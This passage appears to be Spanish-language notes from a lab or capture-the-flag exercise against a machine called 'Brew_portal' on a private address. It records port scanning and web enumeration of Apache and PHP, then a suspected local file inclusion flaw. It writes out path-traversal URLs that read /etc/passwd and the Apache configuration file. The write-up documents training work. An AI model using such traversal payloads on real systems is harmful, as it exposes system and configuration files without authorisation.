...
```
- **Puertos abiertos:** 80.
- **Evidencias:** > [!info] Resultado Nmap > ![](../../../04_Assets/Brew_portal/image20260419112255.png)
### Enumeración Web
```
...
- **Tecnologías:** [[Apache HTTP Server]], [[PHP]].
	- ![](../../../04_Assets/Brew_portal/image20260419113121.png)
	
- **Directorias hallados:** `/server-status.
	- ![](../../../04_Assets/Brew_portal/image20260419112746.png)
...
![](../../../04_Assets/Brew_portal/image20260419114933.png)

- Se observa posible vulnerabilidad LFI en la ruta
	- ![](../../../04_Assets/Brew_portal/image20260419121409.png)
	
	- http://172.17.0.2/?page=../../../../etc/passwd
	- ![](../../../04_Assets/Brew_portal/image20260419122022.png)
	- http://172.17.0.2/?page=../../../../etc/apache2/apache2.conf
	- ![](../../../04_Assets/Brew_portal/image20260419123241.png)
...
- ![](../../../04_Assets/Brew_portal/image20260419123856.png)
